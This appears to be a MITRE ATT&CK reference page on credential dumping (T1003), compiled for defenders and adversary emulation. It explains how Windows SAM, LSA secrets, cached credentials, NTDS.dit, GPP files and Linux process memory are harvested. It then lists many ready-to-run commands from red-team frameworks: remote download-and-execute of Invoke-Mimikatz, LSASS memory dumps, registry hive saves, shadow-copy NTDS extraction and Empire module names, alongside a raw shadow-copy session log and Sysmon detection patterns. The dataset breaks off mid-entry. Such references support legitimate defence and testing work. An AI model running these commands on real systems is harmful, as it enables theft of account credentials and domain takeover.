
# Credential Dumping

## Description

### MITRE Description

> Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Administrator', 'SYSTEM', 'root']
* Platforms: ['Windows', 'Linux', 'macOS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003

## Potential Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

PathToAtomicsFolder\T1003\bin\gsecdump.exe -a

#{gsecdump_exe} -a

#{gsecdump_exe} -a

#{wce_exe} -o %temp%\wce-output.txt

PathToAtomicsFolder\T1003\bin\wce.exe -o #{output_file}

#{wce_exe} -o #{output_file}

#{wce_exe} -o #{output_file}

reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security

#{procdump_exe} -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp

PathToAtomicsFolder\T1003\bin\procdump.exe -accepteula -ma lsass.exe #{output_file}

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full

PathToAtomicsFolder\T1003\bin\Outflank-Dumpert.exe

PathToAtomicsFolder\T1003\bin\mimikatz.exe "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit

#{mimikatz_exe} "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit

ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp" q q

vssadmin.exe create shadow /for=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE

copy #{vsc_name}\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE

findstr /S cpassword %logonserver%\sysvol\*.xml

. PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose

. #{gpp_script_path}
Get-GPPPassword -Verbose

pypykatz live lsa

pypykatz live registry

{'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n', 'payloads': ['powerview.ps1']}}}
{'windows': {'psh': {'command': '$ps_url = "https://download.sysinternals.com/files/Procdump.zip";\n$download_folder = "C:\\Users\\Public\\";\n$staging_folder = "C:\\Users\\Public\\temp";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder"Procdump.zip" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder"\\procdump64.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder"\\procdump.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n'}}}
{'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe']}}}
{'windows': {'psh': {'command': 'Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.ntlm'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.sha1'}]}, 'payloads': ['invoke-mimi.ps1.xored'], 'cleanup': 'Remove-Item -Force -Path "invoke-mimi.ps1"'}}}
{'windows': {'psh': {'command': 'reg query HKLM /f password /t REG_SZ /s\n'}}}
{'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\niex $result; Invoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}]}}}}
ntdsutil.exe
HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
Dos
C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / start
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

[*] Signal sent to start the VSS service.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / create c
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

[*] Attempting to create a shadow copy.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / list
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.

SHADOW COPIES
=============

[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}
[*] Client accessible: True
[*] Count: 1
[*] Device object:? \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1
[*] Differential: True
[*] Exposed locally: False
[*] Exposed name:
[*] Exposed remotely: False
[*] Hardware assisted: False
[*] Imported: False
[*] No auto release: True
[*] Not surfaced: False
[*] No writers: True
[*] Originating machine: ICBC.abcc.org
[*] Persistent: True
[*] Plex: False
[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}
[*] Service machine: ICBC.abcc.org
[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}
[*] State: 12
[*] Transportable: False
[*] Volume name:? \\ \ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \


C: \ Users \ Administrator \ Desktop \ test> copy \\ \ GLOBALROOT \ Device \ HarddiskVolumeShadowCopy1 \ windows \ ntds \ ntds.dit C:? \
We have copied a file.

C: \ Users \ Administrator \ Desktop \ test> cscript vssown.vbs / delete
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. all rights reserved.
```

## Commands Dataset

```
[{'command': 'hashdump\nmimikatz !lsadump::sam',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'hashdump\n'
             'run hashdump\n'
             'run smart_hashdump\n'
             'post/windows/gather/credentials/domain_hashdump',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'logonpasswords\n'
             'mimikatz !sekurlsa::logonpasswords\n'
             'mimikatz !sekurlsa::msv\n'
             'mimikatz !sekurlsa::kerberos\n'
             'mimikatz !sekurlsa::wdigest',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'IEX (New-Object '
             "Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); "
             'Invoke-Mimikatz -DumpCreds\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{gsecdump_exe} -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{gsecdump_exe} -a\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{wce_exe} -o %temp%\\wce-output.txt\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{wce_exe} -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{wce_exe} -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'reg save HKLM\\sam %temp%\\sam\n'
             'reg save HKLM\\system %temp%\\system\n'
             'reg save HKLM\\security %temp%\\security\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{procdump_exe} -accepteula -ma lsass.exe '
             'C:\\Windows\\Temp\\lsass_dump.dmp\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\procdump.exe -accepteula -ma '
             'lsass.exe #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'C:\\Windows\\System32\\rundll32.exe '
             'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
             'lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe '
             '"sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords '
             'full" exit\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '#{mimikatz_exe} "sekurlsa::minidump %tmp%\\lsass.DMP" '
             '"sekurlsa::logonpasswords full" exit\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp" q q\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'vssadmin.exe create shadow /for=C:\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'copy '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit '
             '#{extract_path}\\ntds.dit\n'
             'copy '
             '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM '
             '#{extract_path}\\VSC_SYSTEM_HIVE\n'
             'reg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit '
             'C:\\Windows\\Temp\\ntds.dit\n'
             'copy #{vsc_name}\\Windows\\System32\\config\\SYSTEM '
             'C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\n'
             'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'findstr /S cpassword %logonserver%\\sysvol\\*.xml\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '. PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\n'
             'Get-GPPPassword -Verbose\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': '. #{gpp_script_path}\nGet-GPPPassword -Verbose\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'pypykatz live lsa\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': 'pypykatz live registry\n',
  'name': None,
  'source': 'atomics/T1003/T1003.yaml'},
 {'command': {'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 '
                                             '-Force;\n'
                                             'Get-NetComputer\n',
                                  'payloads': ['powerview.ps1']}}},
  'name': 'Get a list of all computers in a domain',
  'source': 'data/abilities/credential-access/0360ede1-3c28-48d3-a6ef-6e98f562c5af.yml'},
 {'command': {'windows': {'psh': {'command': '$ps_url = '
                                             '"https://download.sysinternals.com/files/Procdump.zip";\n'
                                             '$download_folder = '
                                             '"C:\\Users\\Public\\";\n'
                                             '$staging_folder = '
                                             '"C:\\Users\\Public\\temp";\n'
                                             'Start-BitsTransfer -Source '
                                             '$ps_url -Destination '
                                             '$download_folder;\n'
                                             'Expand-Archive -LiteralPath '
                                             '$download_folder"Procdump.zip" '
                                             '-DestinationPath '
                                             '$staging_folder;\n'
                                             '$arch=[System.Environment]::Is64BitOperatingSystem;\n'
                                             '\n'
                                             'if ($arch) {\n'
                                             '    iex '
                                             '$staging_folder"\\procdump64.exe '
                                             '-accepteula -ma lsass.exe" > '
                                             '$env:APPDATA\\error.dmp 2>&1;\n'
                                             '} else {\n'
                                             '    iex '
                                             '$staging_folder"\\procdump.exe '
                                             '-accepteula -ma lsass.exe" > '
                                             '$env:APPDATA\\error.dmp 2>&1;\n'
                                             '}\n'
                                             'remove-item $staging_folder '
                                             '-Recurse;\n'}}},
  'name': 'Dump lsass for later use with mimikatz',
  'source': 'data/abilities/credential-access/0ef4cc7b-611c-4237-b20b-db36b6906554.yml'},
 {'command': {'windows': {'psh': {'command': '.\\totallylegit.exe '
                                             '#{host.process.id} '
                                             'C:\\Users\\Public\\creds.dmp\n',
                                  'payloads': ['totallylegit.exe']}}},
  'name': 'Custom GO credential dumper using minidumpwritedump',
  'source': 'data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml'},
 {'command': {'windows': {'psh': {'cleanup': 'Remove-Item -Force -Path '
                                             '"invoke-mimi.ps1"',
                                  'command': 'Import-Module '
                                             '.\\invoke-mimi.ps1;\n'
                                             'Invoke-Mimikatz -DumpCreds\n',
                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
                                                                                      'source': 'domain.user.name',
                                                                                      'target': 'domain.user.password'},
                                                                                     {'edge': 'has_hash',
                                                                                      'source': 'domain.user.name',
                                                                                      'target': 'domain.user.ntlm'},
                                                                                     {'edge': 'has_hash',
                                                                                      'source': 'domain.user.name',
                                                                                      'target': 'domain.user.sha1'}]},
                                  'payloads': ['invoke-mimi.ps1.xored']}}},
  'name': 'Use Invoke-Mimikatz',
  'source': 'data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml'},
 {'command': {'windows': {'psh': {'command': 'reg query HKLM /f password /t '
                                             'REG_SZ /s\n'}}},
  'name': 'Search for possible credentials stored in the HKLM Hive',
  'source': 'data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml'},
 {'command': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                             '= { $True };\n'
                                             '$web = (New-Object '
                                             'System.Net.WebClient);\n'
                                             '$result = '
                                             '$web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\n'
                                             'iex $result; Invoke-Mimikatz '
                                             '-DumpCreds\n',
                                  'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
                                                                                      'source': 'domain.user.name',
                                                                                      'target': 'domain.user.password'}]}}}},
  'name': 'Use powerkatz to execute mimikatz and attempt to grab plaintext '
          'and/or hashed passwords',
  'source': 'data/abilities/credential-access/baac2c6d-4652-4b7e-ab0a-f1bf246edd12.yml'},
 {'command': 'ntdsutil.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\SAM|HKLM\\Security\\\\Windows\\\\.+\\\\lsass.exe',
  'name': None,
  'source': 'SysmonHunter - Credential Dumping'},
 {'command': '\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll',
  'name': None,
  'source': 'SysmonHunter - Credential Dumping'},
 {'command': 'powershell/collection/ChromeDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ChromeDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/FoxDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/FoxDump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ninjacopy',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/ninjacopy',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/add_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/add_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/find_keepass_config',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/find_keepass_config',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/get_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/get_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/keethief',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/keethief',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/remove_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/collection/vaults/remove_keepass_config_trigger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/enum_cred_store',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/enum_cred_store',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/cache',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/cache',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/command',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync_hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/dcsync_hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/extract_tickets',
